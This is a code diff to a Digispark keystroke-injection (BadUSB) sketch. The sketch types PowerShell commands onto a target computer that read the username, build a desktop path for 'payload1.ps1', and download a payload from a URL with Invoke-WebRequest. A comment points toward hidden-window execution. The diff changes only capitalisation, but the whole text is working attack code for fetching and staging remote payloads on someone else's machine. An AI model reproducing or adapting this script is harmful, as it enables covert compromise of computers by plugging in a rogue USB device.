@@ -32,11 +32,11 @@ DigiKeyboard.println("$user = [environment]::username");
 DigiKeyboard.update();
 DigiKeyboard.delay(1*runspeed);
 //write to conditional OUTPUT path using the desktop for debugging
-DigiKeyboard.println("$OUTPUT = \"c:\\users\\$user\\desktop\\payload1.ps1\"");
+DigiKeyboard.println("$output = \"C:\\Users\\$user\\Desktop\\payload1.ps1\"");
 DigiKeyboard.update();
 DigiKeyboard.delay(1*runspeed);
 //download the payload from the specified url
-DigiKeyboard.println("invoke-webrequest -uri $url -outfile $OUTPUT");
+DigiKeyboard.println("Invoke-WebRequest -Uri $url -OutFile $output");
 DigiKeyboard.update();
 DigiKeyboard.delay(3*runspeed);
 //-windowstyle hidden
